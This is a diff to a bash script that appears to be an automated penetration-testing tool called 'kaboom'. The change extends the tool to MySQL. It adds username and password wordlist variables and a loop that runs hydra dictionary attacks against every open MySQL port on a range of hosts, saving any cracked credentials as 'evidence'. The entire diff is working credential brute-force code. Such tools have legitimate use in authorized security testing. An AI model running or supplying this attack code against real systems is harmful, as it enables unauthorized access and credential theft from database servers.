@@ -35,6 +35,7 @@ USERLIST_HYDRA_POP3="$KABOOM_PATH/user_wordlist_short.txt"
 USERLIST_HYDRA_IMAP="$KABOOM_PATH/user_wordlist_short.txt"
 USERLIST_HYDRA_RDP="$KABOOM_PATH/user_wordlist_short.txt"
 USERLIST_HYDRA_SMB="$KABOOM_PATH/user_wordlist_short.txt"
+USERLIST_HYDRA_MYSQL="$KABOOM_PATH/user_wordlist_short.txt"
 
 # PASSWORD WORDLISTS
 PASSLIST_HYDRA="$KABOOM_PATH/fasttrack.txt"
@@ -43,6 +44,7 @@ PASSLIST_HYDRA_POP3="$PASSLIST_HYDRA"
 PASSLIST_HYDRA_IMAP="$PASSLIST_HYDRA"
 PASSLIST_HYDRA_RDP="$PASSLIST_HYDRA"
 PASSLIST_HYDRA_SMB="$PASSLIST_HYDRA"
+PASSLIST_HYDRA_MYSQL="$PASSLIST_HYDRA"
 
 # DIRB WORDLISTS
 HTTP_WORDLIST="$KABOOM_PATH/custom_url_wordlist.txt"
@@ -507,6 +509,15 @@ for i in $(seq $LOWER_HOST 1 $UPPER_HOST); do
             for PORT in $(print_portid 'open' 'ms-wbt-server' '1'); do
             hydra -S -s $PORT -v -V -o "$FILE_PATH/DA/PASSWORD/cred_ssl_rdp" -L $USERLIST_HYDRA_RDP -P $PASSLIST_HYDRA_RDP -t 4 $HOST rdp &> "$FILE_PATH/DA/EVIDENCE/ssl_rdp_attack"
             print_std "$(grep 'host:' "$FILE_PATH/DA/PASSWORD/cred_ssl_rdp" || echo 'PASSWORD NOT FOUND')"
+            done;
+        }
+
+        #mysql
+        tcp_service_on 'open' 'mysql' '0' && {
+            print_succ 'starting dictionary attack against MySQL service...';
+            for PORT in $(print_portid 'open' 'mysql' '0'); do
+            hydra -s $PORT -v -V -o "$FILE_PATH/DA/PASSWORD/cred_mysql" -L $USERLIST_HYDRA_MYSQL -P $PASSLIST_HYDRA_MYSQL -t 4 $HOST mysql &> "$FILE_PATH/DA/EVIDENCE/mysql_attack"
+            print_std "$(grep 'host:' "$FILE_PATH/DA/PASSWORD/cred_mysql" || echo 'PASSWORD NOT FOUND')"
             done;
         }
 
